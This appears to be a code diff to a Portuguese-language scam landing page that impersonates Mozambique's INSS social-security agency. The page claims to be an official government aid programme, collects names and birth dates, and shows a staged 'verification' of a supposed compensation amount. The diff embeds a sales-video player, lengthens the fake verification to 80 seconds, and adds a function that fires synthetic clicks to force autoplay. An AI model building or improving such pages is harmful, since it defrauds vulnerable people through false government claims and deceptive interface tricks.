@@ -224,7 +224,7 @@
         .spinner-container { position: relative; width: 70px; height: 70px; margin: 0 auto 25px; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--inss-blue); border-radius: 50%; width: 100%; height: 100%; animation: spin 1s linear infinite; }
         .spinner-icon { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: var(--inss-blue); font-size: 20px; }
-        .progress-bar-container { background: #e0e0e0; border-radius: 10px; height: 12px; width: 100%; margin: 25px 0 15px; overflow: hidden; }
+        .progress-bar-container { background: #e0e0e0; border-radius: 10px; height: 14px; width: 100%; margin: 25px 0 15px; overflow: hidden; }
         .progress-bar { background: linear-gradient(90deg, var(--inss-blue), #00c3ff); height: 100%; width: 0%; transition: width 0.1s linear; border-radius: 10px; }
         .amount-box { background: var(--inss-light); border: 2px dashed var(--inss-blue); border-radius: 8px; padding: 30px 25px 25px; margin: 20px 0; position: relative; }
         .amount-box h1 { color: var(--inss-dark); font-size: 38px; margin: 5px 0 0; font-weight: 700; }
@@ -357,7 +357,7 @@
             <span class="highlight-text">
                 Este é um programa oficial de apoio social e sanitário, autorizado pelo Governo de Moçambique para alívio financeiro imediato.
             </span>
-            <button class="btn-primary btn-attention" onclick="startFlow()">Receber Meu Dinheiro</button>
+            <button class="btn-primary btn-attention" onclick="startFlow()">Verificar Valores Disponiveis para mim</button>
         </div>
     </section>
 
@@ -564,7 +564,7 @@
                 <label>Data de Nascimento</label>
                 <input type="date" id="input-data" required>
             </div>
-            <button class="btn-step" onclick="validateAndProceed()">Continuar</button>
+            <button class="btn-step" onclick="validateAndProceed()">Continuar Verificação</button>
         </div>
 
         <!-- Tela 2: Processamento de 5s -->
@@ -578,16 +578,21 @@
             <p id="loading-text-1">Aguarde enquanto validamos as suas informações no sistema central seguro.</p>
         </div>
 
-        <!-- Tela 3: Verificação (10s) -->
+        <!-- Tela 3: Verificação com Vídeo VTurb -->
         <div class="screen" id="screen-3">
             <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="step-logo">
             <h2>Verificação Oficial de Dados</h2>
             
+            <!-- VTURB VIDEO PLAYER -->
+            <vturb-smartplayer id="vid-6aeb3bfda539367385f89f23" style="display: block; margin: 0 auto 15px auto; width: 100%; border-radius: 12px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.2);">
+                <div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 56.25% 0 0; z-index: 0; background-color: black;"></div>
+            </vturb-smartplayer>
+
             <p style="font-size: 12px; color: var(--success-green); font-weight: bold; margin-bottom: 10px;">
                 <i class="fas fa-shield-alt"></i> Ligação Segura Encriptada
             </p>
             
-            <p id="verify-text" style="font-weight: 500; color: var(--inss-dark); min-height: 40px;">
+            <p id="verify-text" style="font-weight: 500; color: var(--inss-dark); min-height: 40px; text-align: justify; text-align-last: center; line-height: 1.6;">
                 O nosso sistema está a verificar os seus dados com a base de dados nacional para calcular o valor exato da sua indenização.
             </p>
             
@@ -595,8 +600,8 @@
                 <div class="progress-bar" id="progress-bar"></div>
             </div>
             
-            <p style="font-size: 13px; color: #555; background: #f9f9f9; padding: 12px; border-radius: 6px; border: 1px solid #eee;">
-                <i class="fas fa-database" style="color: var(--inss-blue);"></i> <strong>Verificando os dados de </strong><span id="display-nome" style="color: var(--inss-dark); text-transform: uppercase; font-weight: bold;"></span><br>
+            <p style="font-size: 13px; color: #555; background: #f9f9f9; padding: 12px; border-radius: 6px; border: 1px solid #eee; text-align: center;">
+                <i class="fas fa-database" style="color: var(--inss-blue);"></i> <strong>Verificando os dados de </strong><br><span id="display-nome" style="color: var(--inss-dark); text-transform: uppercase; font-weight: bold;"></span>
             </p>
         </div>
 
@@ -678,6 +683,8 @@
             telefone: ""
         };
 
+        let vturbLoaded = false; 
+
         // ================= SCROLL REVEAL ANIMATION =================
         document.addEventListener("DOMContentLoaded", function() {
             const revealElements = document.querySelectorAll('.reveal');
@@ -686,12 +693,11 @@
                 entries.forEach(entry => {
                     if (entry.isIntersecting) {
                         entry.target.classList.add('visible');
-                        // Desobservar depois de aparecer para não animar novamente
                         revealObserver.unobserve(entry.target); 
                     }
                 });
             }, {
-                threshold: 0.15 // Dispara quando 15% do elemento está visível
+                threshold: 0.15 
             });
 
             revealElements.forEach(el => {
@@ -708,8 +714,8 @@
             const startCounters = () => {
                 counters.forEach(counter => {
                     const target = +counter.getAttribute('data-target');
-                    const duration = 2000; // 2 segundos
-                    const increment = target / (duration / 16); // 60fps
+                    const duration = 2000; 
+                    const increment = target / (duration / 16); 
                     
                     let current = 0;
                     const updateCounter = () => {
@@ -733,7 +739,7 @@
                         statsObserver.unobserve(entry.target);
                     }
                 });
-            }, { threshold: 0.5 }); // Dispara quando metade da secção está visível
+            }, { threshold: 0.5 }); 
 
             if(statsSection) {
                 statsObserver.observe(statsSection);
@@ -743,7 +749,6 @@
 
         // ================= FUNÇÕES DO FLUXO =================
 
-        // Iniciar o fluxo com a transição profissional
         function startFlow() {
             let overlay = document.getElementById('transition-overlay');
             overlay.classList.add('active');
@@ -755,7 +760,6 @@
             }, 1500); 
         }
 
-        // Validar idade e prosseguir
         function validateAndProceed() {
             let nomeInput = document.getElementById('input-nome').value.trim();
             let dataInput = document.getElementById('input-data').value;
@@ -802,28 +806,64 @@
                 screen.classList.remove('active');
             });
             document.getElementById('screen-' + screenNumber).classList.add('active');
+            
+            if (screenNumber === 3) {
+                loadVturbPlayer();
+                triggerFakeInteraction();
+            }
         }
 
-        // Animação da barra de progresso e textos dinâmicos
+        // Injetar o script do VTurb
+        function loadVturbPlayer() {
+            if (vturbLoaded) return;
+            
+            var s = document.createElement("script"); 
+            s.src = "https://scripts.converteai.net/713c55ea-13c9-4426-a3f3-f02c1fcabb14/players/6aeb3bfda539367385f89f23/v4/player.js"; 
+            s.async = true; 
+            document.head.appendChild(s); 
+            
+            vturbLoaded = true;
+        }
+
+        // Simular interação para autoplay
+        function triggerFakeInteraction() {
+            setTimeout(() => {
+                const player = document.getElementById('vid-6aeb3bfda539367385f89f23');
+                if (player) {
+                    const clickEvent = new MouseEvent('click', {
+                        view: window,
+                        bubbles: true,
+                        cancelable: true
+                    });
+                    player.dispatchEvent(clickEvent);
+
+                    const playElements = player.querySelectorAll('button, .vturb-play-button, video');
+                    playElements.forEach(el => el.click());
+                }
+                document.body.click();
+            }, 1500); 
+        }
+
+        // Animação da barra de progresso e textos dinâmicos (Agora com 80 segundos = 1:20)
         function startVerification() {
             let progressBar = document.getElementById('progress-bar');
             let verifyText = document.getElementById('verify-text');
             let width = 0;
-            let duration = 10000; 
+            let duration = 80000; // 1 minuto e 20 segundos
             let interval = 100; 
             let step = 100 / (duration / interval);
 
             setTimeout(() => {
                 verifyText.innerHTML = "A verificar histórico de contribuições e vínculo empregatício...";
-            }, 2000);
+            }, 15000);
 
             setTimeout(() => {
                 verifyText.innerHTML = "A cruzar dados com o programa de ação social e sanitária...";
-            }, 5000);
+            }, 40000);
 
             setTimeout(() => {
                 verifyText.innerHTML = `A calcular o valor exato reservado para <strong>${userData.nome}</strong>...`;
-            }, 8000);
+            }, 70000);
 
             let timer = setInterval(() => {
                 if (width >= 100) {
